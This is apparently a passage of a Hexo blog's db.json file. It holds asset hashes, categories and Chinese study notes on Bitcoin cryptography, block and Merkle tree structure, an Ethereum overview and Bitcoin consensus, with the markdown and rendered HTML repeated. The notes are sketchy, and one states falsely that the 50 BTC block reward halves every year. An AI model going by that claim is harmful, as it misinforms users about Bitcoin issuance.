20240722233216.png","hash":"b6e6e3ce9015228f71312b9713d7e8deb6255295","modified":1722149446079},{"_id":"public/2024/08/07/BlockChain/ETH/00-BTC-入门总结/index.html","hash":"aab7fb5a5ba73bc2e5ba132a508e872c23be8bfc","modified":1723034485636},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/2.png","hash":"020784d80e0578275edbe440a6e0125be82fbc00","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/3.png","hash":"3ba81ae24aa116c5987026b3742661d79d5e469a","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/5.png","hash":"2f22bff68d9038f5188ef7b51eb62551373de921","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/4.png","hash":"2715ee6dfb516c5e7a9dcd5975f1f633306447e3","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/7.png","hash":"65634fe117a4c57d8e1b10e887cf8b16258ffc9b","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/6.png","hash":"672d8b356790387e497ba5a516a4bd200aa11878","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/1.png","hash":"8e659253f4255ad5d991370a267b4c0777387e1c","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/11.png","hash":"21866a1e6a954fe20afe244f6a993a48867358b9","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/14.png","hash":"a2539872bdbb2a2f1d7a629deeb4020839a3ee4d","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/12.png","hash":"67778b0094f897c7c3803c42e085f192939edc96","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/13.png","hash":"770c1091b30e32fc949987c49d749700389aa7f5","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/8.png","hash":"b5ceba130367f1c50458a7d418a36bf883301ebb","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/9.png","hash":"1f8327a2282110e97939feb2493925d6d201f470","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理//pic/Pasted image 20240807150054.png","hash":"1edd82f85cd81d9c2854901bfc95c10d30da2765","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理//pic/Pasted image 20240807151713.png","hash":"0b2e9cddcc7ac38bddd89b567920fd17156b30d1","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理//pic/Pasted image 20240807151207.png","hash":"bf5afae27c448677e57fc9b752bdc5ff0f4a90fb","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/image-20240512233007556.png","hash":"c487bf3a1578e18e9f6e8279946f0f47e32fdc15","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理//pic/Pasted image 20240722231809.png","hash":"3d92af11b3bc20a86b5fb6a7bef82441f419aa15","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理//pic/Pasted image 20240722233216.png","hash":"b6e6e3ce9015228f71312b9713d7e8deb6255295","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/10.png","hash":"82a1d35186d586198e065f6def5fb9997eb7cdfc","modified":1723035220563},{"_id":"public/2024/07/21/01 比特币中的密码学原理/d/pic/image-20240512233135377.png","hash":"7bb3b5c06865080514d5f9cda3c62827e032a41e","modified":1723035220563},{"_id":"source/pic/Pasted image 20240807151207.png","hash":"bf5afae27c448677e57fc9b752bdc5ff0f4a90fb","modified":1723014727651},{"_id":"source/pic/Pasted image 20240807150054.png","hash":"1edd82f85cd81d9c2854901bfc95c10d30da2765","modified":1723014054631},{"_id":"source/pic/Pasted image 20240807151713.png","hash":"0b2e9cddcc7ac38bddd89b567920fd17156b30d1","modified":1723015033735},{"_id":"public/pic/Pasted image 20240807151207.png","hash":"bf5afae27c448677e57fc9b752bdc5ff0f4a90fb","modified":1723035260705},{"_id":"public/pic/Pasted image 20240807150054.png","hash":"1edd82f85cd81d9c2854901bfc95c10d30da2765","modified":1723035260705},{"_id":"public/pic/Pasted image 20240807151713.png","hash":"0b2e9cddcc7ac38bddd89b567920fd17156b30d1","modified":1723035260705},{"_id":"source/pic/2.png","hash":"020784d80e0578275edbe440a6e0125be82fbc00","modified":1722526458944},{"_id":"source/pic/3.png","hash":"3ba81ae24aa116c5987026b3742661d79d5e469a","modified":1722526458944},{"_id":"source/pic/4.png","hash":"2715ee6dfb516c5e7a9dcd5975f1f633306447e3","modified":1722526458960},{"_id":"source/pic/6.png","hash":"672d8b356790387e497ba5a516a4bd200aa11878","modified":1722526458961},{"_id":"source/pic/5.png","hash":"2f22bff68d9038f5188ef7b51eb62551373de921","modified":1722526458960},{"_id":"source/pic/7.png","hash":"65634fe117a4c57d8e1b10e887cf8b16258ffc9b","modified":1722526458961},{"_id":"source/pic/1.png","hash":"8e659253f4255ad5d991370a267b4c0777387e1c","modified":1722526458944},{"_id":"source/pic/11.png","hash":"21866a1e6a954fe20afe244f6a993a48867358b9","modified":1722526458944},{"_id":"source/pic/13.png","hash":"770c1091b30e32fc949987c49d749700389aa7f5","modified":1722526458944},{"_id":"source/pic/12.png","hash":"67778b0094f897c7c3803c42e085f192939edc96","modified":1722526458944},{"_id":"source/pic/14.png","hash":"a2539872bdbb2a2f1d7a629deeb4020839a3ee4d","modified":1722526458944},{"_id":"source/pic/8.png","hash":"b5ceba130367f1c50458a7d418a36bf883301ebb","modified":1722526458961},{"_id":"source/pic/9.png","hash":"1f8327a2282110e97939feb2493925d6d201f470","modified":1722526458961},{"_id":"source/pic/image-20240512233007556.png","hash":"c487bf3a1578e18e9f6e8279946f0f47e32fdc15","modified":1722526458944},{"_id":"source/pic/10.png","hash":"82a1d35186d586198e065f6def5fb9997eb7cdfc","modified":1722526458944},{"_id":"source/pic/image-20240512233135377.png","hash":"7bb3b5c06865080514d5f9cda3c62827e032a41e","modified":1722526458944},{"_id":"public/pic/2.png","hash":"020784d80e0578275edbe440a6e0125be82fbc00","modified":1723035331984},{"_id":"public/pic/3.png","hash":"3ba81ae24aa116c5987026b3742661d79d5e469a","modified":1723035331984},{"_id":"public/pic/4.png","hash":"2715ee6dfb516c5e7a9dcd5975f1f633306447e3","modified":1723035331984},{"_id":"public/pic/6.png","hash":"672d8b356790387e497ba5a516a4bd200aa11878","modified":1723035331984},{"_id":"public/pic/5.png","hash":"2f22bff68d9038f5188ef7b51eb62551373de921","modified":1723035331984},{"_id":"public/pic/7.png","hash":"65634fe117a4c57d8e1b10e887cf8b16258ffc9b","modified":1723035331984},{"_id":"public/pic/1.png","hash":"8e659253f4255ad5d991370a267b4c0777387e1c","modified":1723035331984},{"_id":"public/pic/11.png","hash":"21866a1e6a954fe20afe244f6a993a48867358b9","modified":1723035331984},{"_id":"public/pic/13.png","hash":"770c1091b30e32fc949987c49d749700389aa7f5","modified":1723035331984},{"_id":"public/pic/12.png","hash":"67778b0094f897c7c3803c42e085f192939edc96","modified":1723035331984},{"_id":"public/pic/14.png","hash":"a2539872bdbb2a2f1d7a629deeb4020839a3ee4d","modified":1723035331984},{"_id":"public/pic/8.png","hash":"b5ceba130367f1c50458a7d418a36bf883301ebb","modified":1723035331984},{"_id":"public/pic/9.png","hash":"1f8327a2282110e97939feb2493925d6d201f470","modified":1723035331984},{"_id":"public/pic/image-20240512233007556.png","hash":"c487bf3a1578e18e9f6e8279946f0f47e32fdc15","modified":1723035331984},{"_id":"public/pic/10.png","hash":"82a1d35186d586198e065f6def5fb9997eb7cdfc","modified":1723035331984},{"_id":"public/pic/image-20240512233135377.png","hash":"7bb3b5c06865080514d5f9cda3c62827e032a41e","modified":1723035331984}],"Category":[{"name":"BlockChain","_id":"clz7mrmjq00048wun040u8kwp"},{"name":"BTC","parent":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmjx000i8wun7cww9qo9"},{"name":"ETH","parent":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmk1000w8wun2ca7bimo"},{"name":"网络协议","_id":"clz7mrmk800288wun17ul97vd"},{"name":"CVE","_id":"clz7mrmka002k8wun8ywr3teg"},{"name":"SSH","parent":"clz7mrmk800288wun17ul97vd","_id":"clz7mrmka002p8wun7lsecehb"},{"name":"CVE-2024-6387","parent":"clz7mrmka002k8wun8ywr3teg","_id":"clz7mrmkb00318wun5u1sduq2"},{"name":"Road","parent":"clz7mrmjq00048wun040u8kwp","_id":"clzbh821j00062sunb9sea6p4"}],"Data":[],"Page":[{"title":"about","date":"2024-07-22T08:01:45.000Z","_content":"","source":"about/index.md","raw":"---\ntitle: about\ndate: 2024-07-22 16:01:45\n---\n","updated":"2024-07-28T06:53:53.433Z","path":"about/index.html","comments":1,"layout":"page","_id":"clz7mrmjj00008wunfaed0r1w","content":"","excerpt":"","more":""},{"title":"分类","date":"2024-07-22T08:37:59.000Z","type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\ndate: 2024-07-22 16:37:59\ntype: categories\n---\n","updated":"2024-07-28T06:53:53.433Z","path":"categories/index.html","comments":1,"layout":"page","_id":"clz7mrmjo00028wunempb5qp3","content":"","excerpt":"","more":""}],"Post":[{"title":"01 比特币中的密码学原理","date":"2024-07-21T12:20:41.000Z","_content":"# 1.哈希函数\n\n### 性质\n- collision resistance：哈希碰撞十分困难。\n- hiding：即不可逆的性质。\n- puzzle friendly：雪崩效应。\n\n### 作用\n- 生成摘要，做完整性验证。\n- 数字签名\n- 数字信封，验证信息。\n\n# 2.对称加密\n\n### 性质\n- 密钥传输需要在安全的条件，密钥分发不便。\n- \n\n### 作用\n- \n# 3.非对称加密\n\n### 条件\n- 好的随机源，防止生成的随机数的重复。\n\n### 性质\n- 已知公钥，生成私钥是十分困难。\n\n### 作用\n- 使用公私密钥对，进行加密与验证。\n\n\n# 4.公私钥对的生成\n\n[比特币公私钥对生成](https://www.cnblogs.com/kumata/p/10477369.html)\n\n\n","source":"_posts/01 比特币中的密码学原理.md","raw":"---\ntitle: 01 比特币中的密码学原理\ndate: 2024-07-21 20:20:41\ntags: \n - BTC\n - BlockChain\ncategories:\n - BlockChain\n - BTC\n---\n# 1.哈希函数\n\n### 性质\n- collision resistance：哈希碰撞十分困难。\n- hiding：即不可逆的性质。\n- puzzle friendly：雪崩效应。\n\n### 作用\n- 生成摘要，做完整性验证。\n- 数字签名\n- 数字信封，验证信息。\n\n# 2.对称加密\n\n### 性质\n- 密钥传输需要在安全的条件，密钥分发不便。\n- \n\n### 作用\n- \n# 3.非对称加密\n\n### 条件\n- 好的随机源，防止生成的随机数的重复。\n\n### 性质\n- 已知公钥，生成私钥是十分困难。\n\n### 作用\n- 使用公私密钥对，进行加密与验证。\n\n\n# 4.公私钥对的生成\n\n[比特币公私钥对生成](https://www.cnblogs.com/kumata/p/10477369.html)\n\n\n","slug":"01 比特币中的密码学原理","published":1,"updated":"2024-07-31T15:55:39.683Z","_id":"clz7mrmjm00018wunhspdg6wn","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"1-哈希函数\"><a href=\"#1-哈希函数\" class=\"headerlink\" title=\"1.哈希函数\"></a>1.哈希函数</h1><h3 id=\"性质\"><a href=\"#性质\" class=\"headerlink\" title=\"性质\"></a>性质</h3><ul>\n<li>collision resistance：哈希碰撞十分困难。</li>\n<li>hiding：即不可逆的性质。</li>\n<li>puzzle friendly：雪崩效应。</li>\n</ul>\n<h3 id=\"作用\"><a href=\"#作用\" class=\"headerlink\" title=\"作用\"></a>作用</h3><ul>\n<li>生成摘要，做完整性验证。</li>\n<li>数字签名</li>\n<li>数字信封，验证信息。</li>\n</ul>\n<h1 id=\"2-对称加密\"><a href=\"#2-对称加密\" class=\"headerlink\" title=\"2.对称加密\"></a>2.对称加密</h1><h3 id=\"性质-1\"><a href=\"#性质-1\" class=\"headerlink\" title=\"性质\"></a>性质</h3><ul>\n<li>密钥传输需要在安全的条件，密钥分发不便。</li>\n<li></li>\n</ul>\n<h3 id=\"作用-1\"><a href=\"#作用-1\" class=\"headerlink\" title=\"作用\"></a>作用</h3><p>- </p>\n<h1 id=\"3-非对称加密\"><a href=\"#3-非对称加密\" class=\"headerlink\" title=\"3.非对称加密\"></a>3.非对称加密</h1><h3 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h3><ul>\n<li>好的随机源，防止生成的随机数的重复。</li>\n</ul>\n<h3 id=\"性质-2\"><a href=\"#性质-2\" class=\"headerlink\" title=\"性质\"></a>性质</h3><ul>\n<li>已知公钥，生成私钥是十分困难。</li>\n</ul>\n<h3 id=\"作用-2\"><a href=\"#作用-2\" class=\"headerlink\" title=\"作用\"></a>作用</h3><ul>\n<li>使用公私密钥对，进行加密与验证。</li>\n</ul>\n<h1 id=\"4-公私钥对的生成\"><a href=\"#4-公私钥对的生成\" class=\"headerlink\" title=\"4.公私钥对的生成\"></a>4.公私钥对的生成</h1><p><a href=\"https://www.cnblogs.com/kumata/p/10477369.html\">比特币公私钥对生成</a></p>\n","excerpt":"","more":"<h1 id=\"1-哈希函数\"><a href=\"#1-哈希函数\" class=\"headerlink\" title=\"1.哈希函数\"></a>1.哈希函数</h1><h3 id=\"性质\"><a href=\"#性质\" class=\"headerlink\" title=\"性质\"></a>性质</h3><ul>\n<li>collision resistance：哈希碰撞十分困难。</li>\n<li>hiding：即不可逆的性质。</li>\n<li>puzzle friendly：雪崩效应。</li>\n</ul>\n<h3 id=\"作用\"><a href=\"#作用\" class=\"headerlink\" title=\"作用\"></a>作用</h3><ul>\n<li>生成摘要，做完整性验证。</li>\n<li>数字签名</li>\n<li>数字信封，验证信息。</li>\n</ul>\n<h1 id=\"2-对称加密\"><a href=\"#2-对称加密\" class=\"headerlink\" title=\"2.对称加密\"></a>2.对称加密</h1><h3 id=\"性质-1\"><a href=\"#性质-1\" class=\"headerlink\" title=\"性质\"></a>性质</h3><ul>\n<li>密钥传输需要在安全的条件，密钥分发不便。</li>\n<li></li>\n</ul>\n<h3 id=\"作用-1\"><a href=\"#作用-1\" class=\"headerlink\" title=\"作用\"></a>作用</h3><p>- </p>\n<h1 id=\"3-非对称加密\"><a href=\"#3-非对称加密\" class=\"headerlink\" title=\"3.非对称加密\"></a>3.非对称加密</h1><h3 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h3><ul>\n<li>好的随机源，防止生成的随机数的重复。</li>\n</ul>\n<h3 id=\"性质-2\"><a href=\"#性质-2\" class=\"headerlink\" title=\"性质\"></a>性质</h3><ul>\n<li>已知公钥，生成私钥是十分困难。</li>\n</ul>\n<h3 id=\"作用-2\"><a href=\"#作用-2\" class=\"headerlink\" title=\"作用\"></a>作用</h3><ul>\n<li>使用公私密钥对，进行加密与验证。</li>\n</ul>\n<h1 id=\"4-公私钥对的生成\"><a href=\"#4-公私钥对的生成\" class=\"headerlink\" title=\"4.公私钥对的生成\"></a>4.公私钥对的生成</h1><p><a href=\"https://www.cnblogs.com/kumata/p/10477369.html\">比特币公私钥对生成</a></p>\n"},{"title":"02 BTC-数据结构","date":"2024-07-21T12:20:42.000Z","_content":"# 1. 区块关系-链表形式\n\n### 区块格式\n\n- 前一个HASH\n- 本区块的区块信息。\n- 二者合并取HASH为本区块的HASH值。\n\n\n# 2. 默克尔树\n\n### 作用\n\n- 验证数据的完整性。\n- 交易的组成形式为默克尔树。\n- 根哈希值在block header里面。\n\n### 验证交易的可信性\n\n![](../pic/Pasted%20image%2020240711184141.png)\n\n说明：\n- 轻节点具有交易的默克尔树的跟哈希。\n- 只用提供交易路径上的哈希值，即可计算是否与根哈希值符合。\n- 其中区块中的两个哈希值，表示两个哈希值的哈希值。\n\n### 证明区块不存在区块中\n\n操作：对于所有的交易HASH都排序，比特币没有排序。\n\n# 3. 区块内容\n\n### block header\n\n- 协议\n- 前一个区块头的HASH。\n- 交易的默克尔根HASH。\n- target，目标值。\n- Nonce，随机数值。\n\n### block body\n\n- 包含交易信息。\n","source":"_posts/02 BTC-数据结构.md","raw":"---\ntitle: 02 BTC-数据结构\ndate: 2024-07-21 20:20:42\ntags: \n - BTC\n - BlockChain\ncategories:\n - BlockChain\n - BTC\n---\n# 1. 区块关系-链表形式\n\n### 区块格式\n\n- 前一个HASH\n- 本区块的区块信息。\n- 二者合并取HASH为本区块的HASH值。\n\n\n# 2. 默克尔树\n\n### 作用\n\n- 验证数据的完整性。\n- 交易的组成形式为默克尔树。\n- 根哈希值在block header里面。\n\n### 验证交易的可信性\n\n![](../pic/Pasted%20image%2020240711184141.png)\n\n说明：\n- 轻节点具有交易的默克尔树的跟哈希。\n- 只用提供交易路径上的哈希值，即可计算是否与根哈希值符合。\n- 其中区块中的两个哈希值，表示两个哈希值的哈希值。\n\n### 证明区块不存在区块中\n\n操作：对于所有的交易HASH都排序，比特币没有排序。\n\n# 3. 区块内容\n\n### block header\n\n- 协议\n- 前一个区块头的HASH。\n- 交易的默克尔根HASH。\n- target，目标值。\n- Nonce，随机数值。\n\n### block body\n\n- 包含交易信息。\n","slug":"02 BTC-数据结构","published":1,"updated":"2024-07-28T06:53:53.429Z","comments":1,"layout":"post","photos":[],"_id":"clz7mrmjo00038wunhibl6t3w","content":"<h1 id=\"1-区块关系-链表形式\"><a href=\"#1-区块关系-链表形式\" class=\"headerlink\" title=\"1. 区块关系-链表形式\"></a>1. 区块关系-链表形式</h1><h3 id=\"区块格式\"><a href=\"#区块格式\" class=\"headerlink\" title=\"区块格式\"></a>区块格式</h3><ul>\n<li>前一个HASH</li>\n<li>本区块的区块信息。</li>\n<li>二者合并取HASH为本区块的HASH值。</li>\n</ul>\n<h1 id=\"2-默克尔树\"><a href=\"#2-默克尔树\" class=\"headerlink\" title=\"2. 默克尔树\"></a>2. 默克尔树</h1><h3 id=\"作用\"><a href=\"#作用\" class=\"headerlink\" title=\"作用\"></a>作用</h3><ul>\n<li>验证数据的完整性。</li>\n<li>交易的组成形式为默克尔树。</li>\n<li>根哈希值在block header里面。</li>\n</ul>\n<h3 id=\"验证交易的可信性\"><a href=\"#验证交易的可信性\" class=\"headerlink\" title=\"验证交易的可信性\"></a>验证交易的可信性</h3><p><img src=\"/../pic/Pasted%20image%2020240711184141.png\"></p>\n<p>说明：</p>\n<ul>\n<li>轻节点具有交易的默克尔树的跟哈希。</li>\n<li>只用提供交易路径上的哈希值，即可计算是否与根哈希值符合。</li>\n<li>其中区块中的两个哈希值，表示两个哈希值的哈希值。</li>\n</ul>\n<h3 id=\"证明区块不存在区块中\"><a href=\"#证明区块不存在区块中\" class=\"headerlink\" title=\"证明区块不存在区块中\"></a>证明区块不存在区块中</h3><p>操作：对于所有的交易HASH都排序，比特币没有排序。</p>\n<h1 id=\"3-区块内容\"><a href=\"#3-区块内容\" class=\"headerlink\" title=\"3. 区块内容\"></a>3. 区块内容</h1><h3 id=\"block-header\"><a href=\"#block-header\" class=\"headerlink\" title=\"block header\"></a>block header</h3><ul>\n<li>协议</li>\n<li>前一个区块头的HASH。</li>\n<li>交易的默克尔根HASH。</li>\n<li>target，目标值。</li>\n<li>Nonce，随机数值。</li>\n</ul>\n<h3 id=\"block-body\"><a href=\"#block-body\" class=\"headerlink\" title=\"block body\"></a>block body</h3><ul>\n<li>包含交易信息。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"1-区块关系-链表形式\"><a href=\"#1-区块关系-链表形式\" class=\"headerlink\" title=\"1. 区块关系-链表形式\"></a>1. 区块关系-链表形式</h1><h3 id=\"区块格式\"><a href=\"#区块格式\" class=\"headerlink\" title=\"区块格式\"></a>区块格式</h3><ul>\n<li>前一个HASH</li>\n<li>本区块的区块信息。</li>\n<li>二者合并取HASH为本区块的HASH值。</li>\n</ul>\n<h1 id=\"2-默克尔树\"><a href=\"#2-默克尔树\" class=\"headerlink\" title=\"2. 默克尔树\"></a>2. 默克尔树</h1><h3 id=\"作用\"><a href=\"#作用\" class=\"headerlink\" title=\"作用\"></a>作用</h3><ul>\n<li>验证数据的完整性。</li>\n<li>交易的组成形式为默克尔树。</li>\n<li>根哈希值在block header里面。</li>\n</ul>\n<h3 id=\"验证交易的可信性\"><a href=\"#验证交易的可信性\" class=\"headerlink\" title=\"验证交易的可信性\"></a>验证交易的可信性</h3><p><img src=\"/../pic/Pasted%20image%2020240711184141.png\"></p>\n<p>说明：</p>\n<ul>\n<li>轻节点具有交易的默克尔树的跟哈希。</li>\n<li>只用提供交易路径上的哈希值，即可计算是否与根哈希值符合。</li>\n<li>其中区块中的两个哈希值，表示两个哈希值的哈希值。</li>\n</ul>\n<h3 id=\"证明区块不存在区块中\"><a href=\"#证明区块不存在区块中\" class=\"headerlink\" title=\"证明区块不存在区块中\"></a>证明区块不存在区块中</h3><p>操作：对于所有的交易HASH都排序，比特币没有排序。</p>\n<h1 id=\"3-区块内容\"><a href=\"#3-区块内容\" class=\"headerlink\" title=\"3. 区块内容\"></a>3. 区块内容</h1><h3 id=\"block-header\"><a href=\"#block-header\" class=\"headerlink\" title=\"block header\"></a>block header</h3><ul>\n<li>协议</li>\n<li>前一个区块头的HASH。</li>\n<li>交易的默克尔根HASH。</li>\n<li>target，目标值。</li>\n<li>Nonce，随机数值。</li>\n</ul>\n<h3 id=\"block-body\"><a href=\"#block-body\" class=\"headerlink\" title=\"block body\"></a>block body</h3><ul>\n<li>包含交易信息。</li>\n</ul>\n"},{"title":"01-ETH-概述","date":"2024-07-25T15:14:54.000Z","_content":"\n# ETH特殊性\n\n- 提高内存要求。\n- goust共识机制。\n- 智能合约，去中心化的合约\n\n\n\n# 去中心化的货币与法币的优势\n\n- 跨国转账\n# 去中心化合同有什么用\n\n- 跨国签署。\n\n","source":"_posts/01-ETH-概述.md","raw":"---\ntitle: 01-ETH-概述\ndate: 2024-07-25 23:14:54\ntags: \n - ETH\n - BlockChain\ncategories:\n - BlockChain\n - ETH\n---\n\n# ETH特殊性\n\n- 提高内存要求。\n- goust共识机制。\n- 智能合约，去中心化的合约\n\n\n\n# 去中心化的货币与法币的优势\n\n- 跨国转账\n# 去中心化合同有什么用\n\n- 跨国签署。\n\n","slug":"01-ETH-概述","published":1,"updated":"2024-08-01T16:18:34.841Z","_id":"clz7mrmjr00068wun88hh96q1","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"ETH特殊性\"><a href=\"#ETH特殊性\" class=\"headerlink\" title=\"ETH特殊性\"></a>ETH特殊性</h1><ul>\n<li>提高内存要求。</li>\n<li>goust共识机制。</li>\n<li>智能合约，去中心化的合约</li>\n</ul>\n<h1 id=\"去中心化的货币与法币的优势\"><a href=\"#去中心化的货币与法币的优势\" class=\"headerlink\" title=\"去中心化的货币与法币的优势\"></a>去中心化的货币与法币的优势</h1><ul>\n<li>跨国转账</li>\n</ul>\n<h1 id=\"去中心化合同有什么用\"><a href=\"#去中心化合同有什么用\" class=\"headerlink\" title=\"去中心化合同有什么用\"></a>去中心化合同有什么用</h1><ul>\n<li>跨国签署。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"ETH特殊性\"><a href=\"#ETH特殊性\" class=\"headerlink\" title=\"ETH特殊性\"></a>ETH特殊性</h1><ul>\n<li>提高内存要求。</li>\n<li>goust共识机制。</li>\n<li>智能合约，去中心化的合约</li>\n</ul>\n<h1 id=\"去中心化的货币与法币的优势\"><a href=\"#去中心化的货币与法币的优势\" class=\"headerlink\" title=\"去中心化的货币与法币的优势\"></a>去中心化的货币与法币的优势</h1><ul>\n<li>跨国转账</li>\n</ul>\n<h1 id=\"去中心化合同有什么用\"><a href=\"#去中心化合同有什么用\" class=\"headerlink\" title=\"去中心化合同有什么用\"></a>去中心化合同有什么用</h1><ul>\n<li>跨国签署。</li>\n</ul>\n"},{"title":"03 BTC-协议","date":"2024-07-21T12:20:43.000Z","_content":"# 1. 货币问题\n\n## 简单的签名货币的问题\n\n- 简单的通过非对称加密进行验证。\n- 重复花费。\n\n### 中心化问题\n\n# 2. 解决双花攻击\n\n\n# 3. 货币发行\n\n### 铸币交易\n\n说明：block reward，凭空产生，不用说明币的来源。\n\n收益：50 BTC 每年减半。\n- 争夺记账权叫挖矿。\n\n交易：在交易过程中，需要用发起转账的用户对于交易进行签名，并且说明花费的比特币的来源。\n\n# 4. 区块信息\n\n## 区块头\n\n- 协议\n- 前一个区块头的HASH。\n- 交易的默克尔根HASH。\n- target，目标值。\n- Nonce，随机数值。\n\n## 区块体\n\n- 交易列表。\n\n\n\n# 5. 非对称密码学知识\n\n- 公钥加密，私钥解密。\n\n\n# 6. 分布式共识\n\n- 一个节点是不诚实的的异步无上界的网络，公式是不可信的。\n-  一致性、可容忍性、分布式\n\n\n# 7.共识协议\n\n前提：大部分节点诚实的，少部分是恶意的。\n\n### 基于投票的问题\n\n- 谁投票\n- 效率\n- 女巫攻击，伪造大量的假节点，进行恶意投票。\n\n### 基于算力的共识机制\n\n#### 不接受区块\n\n- 区块链分叉\n- 交易有问题\n- nonce不符合target的要求\n\n#### 接受区块\n\n- 最长合法链\n\n\n#### 记账权的区块\n\n说明：只有算力强的矿工或者矿主才能够拥有记账权，尝试成功nonc值才能够打包区块。\n\n- 个人的算力基本是固定的，算力越强，基本的权重也就越高。\n- 可以防范女巫攻击，跟用户多少无直接关系，跟算力大小直接相关。","source":"_posts/03 BTC-协议.md","raw":"---\ntitle: 03 BTC-协议\ndate: 2024-07-21 20:20:43\ntags: \n - BTC\n - BlockChain\ncategories:\n - BlockChain\n - BTC\n---\n# 1. 货币问题\n\n## 简单的签名货币的问题\n\n- 简单的通过非对称加密进行验证。\n- 重复花费。\n\n### 中心化问题\n\n# 2. 解决双花攻击\n\n\n# 3. 货币发行\n\n### 铸币交易\n\n说明：block reward，凭空产生，不用说明币的来源。\n\n收益：50 BTC 每年减半。\n- 争夺记账权叫挖矿。\n\n交易：在交易过程中，需要用发起转账的用户对于交易进行签名，并且说明花费的比特币的来源。\n\n# 4. 区块信息\n\n## 区块头\n\n- 协议\n- 前一个区块头的HASH。\n- 交易的默克尔根HASH。\n- target，目标值。\n- Nonce，随机数值。\n\n## 区块体\n\n- 交易列表。\n\n\n\n# 5. 非对称密码学知识\n\n- 公钥加密，私钥解密。\n\n\n# 6. 分布式共识\n\n- 一个节点是不诚实的的异步无上界的网络，公式是不可信的。\n-  一致性、可容忍性、分布式\n\n\n# 7.共识协议\n\n前提：大部分节点诚实的，少部分是恶意的。\n\n### 基于投票的问题\n\n- 谁投票\n- 效率\n- 女巫攻击，伪造大量的假节点，进行恶意投票。\n\n### 基于算力的共识机制\n\n#### 不接受区块\n\n- 区块链分叉\n- 交易有问题\n- nonce不符合target的要求\n\n#### 接受区块\n\n- 最长合法链\n\n\n#### 记账权的区块\n\n说明：只有算力强的矿工或者矿主才能够拥有记账权，尝试成功nonc值才能够打包区块。\n\n- 个人的算力基本是固定的，算力越强，基本的权重也就越高。\n- 可以防范女巫攻击，跟用户多少无直接关系，跟算力大小直接相关。","slug":"03 BTC-协议","published":1,"updated":"2024-07-28T06:53:53.430Z","comments":1,"layout":"post","photos":[],"_id":"clz7mrmjs00078wunalxqac9h","content":"<h1 id=\"1-货币问题\"><a href=\"#1-货币问题\" class=\"headerlink\" title=\"1. 货币问题\"></a>1. 货币问题</h1><h2 id=\"简单的签名货币的问题\"><a href=\"#简单的签名货币的问题\" class=\"headerlink\" title=\"简单的签名货币的问题\"></a>简单的签名货币的问题</h2><ul>\n<li>简单的通过非对称加密进行验证。</li>\n<li>重复花费。</li>\n</ul>\n<h3 id=\"中心化问题\"><a href=\"#中心化问题\" class=\"headerlink\" title=\"中心化问题\"></a>中心化问题</h3><h1 id=\"2-解决双花攻击\"><a href=\"#2-解决双花攻击\" class=\"headerlink\" title=\"2. 解决双花攻击\"></a>2. 解决双花攻击</h1><h1 id=\"3-货币发行\"><a href=\"#3-货币发行\" class=\"headerlink\" title=\"3. 货币发行\"></a>3. 货币发行</h1><h3 id=\"铸币交易\"><a href=\"#铸币交易\" class=\"headerlink\" title=\"铸币交易\"></a>铸币交易</h3><p>说明：block reward，凭空产生，不用说明币的来源。</p>\n<p>收益：50 BTC 每年减半。</p>\n<ul>\n<li>争夺记账权叫挖矿。</li>\n</ul>\n<p>交易：在交易过程中，需要用发起转账的用户对于交易进行签名，并且说明花费的比特币的来源。</p>\n<h1 id=\"4-区块信息\"><a href=\"#4-区块信息\" class=\"headerlink\" title=\"4. 区块信息\"></a>4. 区块信息</h1><h2 id=\"区块头\"><a href=\"#区块头\" class=\"headerlink\" title=\"区块头\"></a>区块头</h2><ul>\n<li>协议</li>\n<li>前一个区块头的HASH。</li>\n<li>交易的默克尔根HASH。</li>\n<li>target，目标值。</li>\n<li>Nonce，随机数值。</li>\n</ul>\n<h2 id=\"区块体\"><a href=\"#区块体\" class=\"headerlink\" title=\"区块体\"></a>区块体</h2><ul>\n<li>交易列表。</li>\n</ul>\n<h1 id=\"5-非对称密码学知识\"><a href=\"#5-非对称密码学知识\" class=\"headerlink\" title=\"5. 非对称密码学知识\"></a>5. 非对称密码学知识</h1><ul>\n<li>公钥加密，私钥解密。</li>\n</ul>\n<h1 id=\"6-分布式共识\"><a href=\"#6-分布式共识\" class=\"headerlink\" title=\"6. 分布式共识\"></a>6. 分布式共识</h1><ul>\n<li>一个节点是不诚实的的异步无上界的网络，公式是不可信的。</li>\n<li>一致性、可容忍性、分布式</li>\n</ul>\n<h1 id=\"7-共识协议\"><a href=\"#7-共识协议\" class=\"headerlink\" title=\"7.共识协议\"></a>7.共识协议</h1><p>前提：大部分节点诚实的，少部分是恶意的。</p>\n<h3 id=\"基于投票的问题\"><a href=\"#基于投票的问题\" class=\"headerlink\" 